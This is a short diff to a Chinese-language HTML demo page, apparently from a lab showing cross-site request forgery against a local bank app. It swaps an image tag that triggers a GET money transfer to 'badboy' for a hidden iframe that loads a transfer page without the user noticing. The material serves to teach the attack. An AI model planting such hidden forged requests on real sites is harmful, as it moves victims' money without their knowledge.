@@ -6,9 +6,11 @@
   <title>银行 csrf 页面</title>
 </head>
 <body>
-  <h2>通过图片 src 发起跨站请求</h2>
-  <img src="http://localhost:3001/api/transfer_money?username=badboy&money=1000"/>
-  <h2>如果 get 请求不通过,则 3s 后通过 iframe 会发起 post 请求</h2>
-  <iframe src="/bank-fish-iframe.html" frameborder="0"></iframe>
+  <h2>通过 iframe 会发起转账请求, 用户无感知</h2>
+  <iframe
+    style="display:none"
+    src="http://localhost:3001/bank-transfer.html"
+  >
+  </iframe>
 </body>
 </html>
